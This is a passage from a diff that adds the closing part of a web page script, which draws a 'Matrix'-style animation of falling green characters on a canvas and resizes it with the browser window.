+const drops = Array(Math.floor(columns)).fill(1);
+function drawMatrix() {
+  ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+  ctx.fillRect(0, 0, cw, ch);
+  ctx.fillStyle = '#0F0';
+  ctx.font = fontSize + 'px "Fira Code", monospace';
+  for (let i = 0; i < drops.length; i++) {
+    const text = chars[Math.floor(Math.random() * chars.length)];
+    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+    if (drops[i] * fontSize > ch && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  }
+}
+setInterval(drawMatrix, 33);
+window.addEventListener('resize', () => {
+  cw = window.innerWidth; ch = window.innerHeight;
+  canvas.width = cw; canvas.height = ch;
+});
+
+</script>
+</body>
+</html>
